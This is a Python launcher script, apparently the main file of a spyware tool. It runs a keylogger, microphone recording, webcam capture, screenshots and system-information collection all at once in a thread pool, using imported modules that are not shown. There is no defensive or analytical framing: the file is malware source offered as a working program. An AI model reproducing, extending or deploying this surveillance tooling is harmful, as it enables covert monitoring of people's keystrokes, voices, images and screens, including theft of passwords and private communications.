#!/usr/bin/python3

import concurrent.futures

from src.keylogger import KeyLogger
from src.system_info import SysInfo
from src.screenshots import Screenshots
from src.microphone import Microphone
from src.webcamera import WebCamera

from src.make_dir import run

def microphone():
    m = Microphone()
    m.run()

def mkdir():
    run()

def screenshot():
    screen = Screenshots()
    screen.run()

def system_info():
    sysf = SysInfo()
    sysf.run()

def keylogger():
    k = KeyLogger()
    k.run()

def web_camera():
    w = WebCamera()
    w.run()


if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.submit(mkdir)
        executor.submit(microphone)
        executor.submit(screenshot)
        executor.submit(system_info)
        executor.submit(keylogger)
        executor.submit(web_camera)
